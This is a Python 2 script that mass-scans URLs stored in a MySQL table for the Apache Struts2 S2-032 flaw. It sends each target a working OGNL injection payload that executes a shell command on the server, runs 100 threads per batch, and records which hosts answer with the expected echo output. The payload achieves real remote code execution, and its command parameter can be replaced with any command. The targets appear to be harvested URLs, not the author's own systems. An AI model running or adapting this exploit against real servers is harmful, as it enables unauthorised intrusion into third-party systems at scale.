#coding=utf-8

import requests
import threading
import mysql.connector

payload_check = "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=echo ohthatsgood&pp=\\A&ppp=%20&encoding=UTF-8"
headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"}

config = {
'host':'127.0.0.1',
'user':'toor',
'password':'changeme',
'port':'3306',
'database':'google'
}
   
def check(id,url):
    try:
        res = requests.get(url + payload_check,headers = headers)
        if res.status_code == 200:
            if res.content.strip() == "ohthatsgood":
                print url
                updatestr = "update struts2 set s2032 = 1 where id = {}".format(id)
                con = mysql.connector.connect(**config)
                cursor = con.cursor()
                cursor.execute(updatestr)
                con.commit()
                cursor.close()
                con.close()
                return
            else:
                return
        else:
            return
    except:
        return      

selectstr = "select id,format_url from struts2"
con = mysql.connector.connect(**config)
cursor = con.cursor()
cursor.execute(selectstr)
results = cursor.fetchall()
cursor.close()
threads = []
count = 0
final = len(results)

try:
    for result in results:
        id = result[0]
        url = result[1]
        threads.append(threading.Thread(target = check,args=(id,url)))
        count = count + 1
        try:
            if (count % 100) == 0 or count == final:
                for thread in threads:
                    thread.start()
                for thread in threads:
                    thread.join()
                threads = []
                process = float(count)/float(final)
                print "%.2f%% checked."%(process*100)
        except Exception,e:
            print e
except KeyboardInterrupt:
    print count + " urls finished!"

print count + "urls finished!"  
